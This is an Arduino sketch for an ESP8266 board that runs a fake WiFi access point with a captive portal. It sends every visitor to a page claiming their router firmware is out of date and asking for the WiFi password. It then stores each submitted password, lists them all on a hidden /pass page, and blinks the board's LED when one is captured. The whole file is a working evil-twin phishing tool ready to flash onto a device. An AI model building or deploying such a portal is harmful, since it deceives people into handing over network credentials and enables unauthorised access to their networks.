// ESP8266 WiFi Captive Portal
// Based on: PopupChat https://github.com/tlack/popup-chat
// Based on: Captive Portal by: M. Ray Burnette 20150831
// Based on: https://github.com/tomhiggins/MsgDrop
// Modded by BlueArduino20

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>

// User configuration
#define SSID_NAME "My SSID"
#define SUBTITLE "Router info."
#define TITLE "Update"
#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
#define POST_TITLE "Updating..."
#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
#define PASS_TITLE "Passwords:"

// Init System Settings
const byte HTTP_CODE = 200; // nyi? 511; // rfc6585
const byte DNS_PORT = 53;  // Capture DNS requests on port 53
const byte TICK_TIMER = 1000;
IPAddress APIP(10, 10, 10, 1);    // Private network for server

String allMsgs="";
unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0; // timers
DNSServer dnsServer; ESP8266WebServer webServer(80); // standard api servers

String input(String argName) {
  String a=webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { return 
  "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; }

String pass() {
  return header(PASS_TITLE) + "<ol>"+allMsgs+"</ol><br><a href=/>Back to Index</a>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><center><div><form action=/post method=post><label>WiFi password:</label>"+
    "<input type=password name=m></input><input type=submit value=Start></form></center>" + footer();
}

String posted() {
  String msg=input("m"); allMsgs="<li><b>"+msg+"</b></li>"+allMsgs;
  return header(POST_TITLE) + POST_BODY + footer();
}

void BLINK() { // The internal LED will blink 5 times.
  int count = 0;
  while(count < 5){
    digitalWrite(BUILTIN_LED, LOW);
    delay(350);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(350);
    count = count + 1;
  }
}

void setup() {
  
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}


void loop() { 
  if ((millis()-lastTick)>TICK_TIMER) {lastTick=millis();} 
dnsServer.processNextRequest(); webServer.handleClient(); }
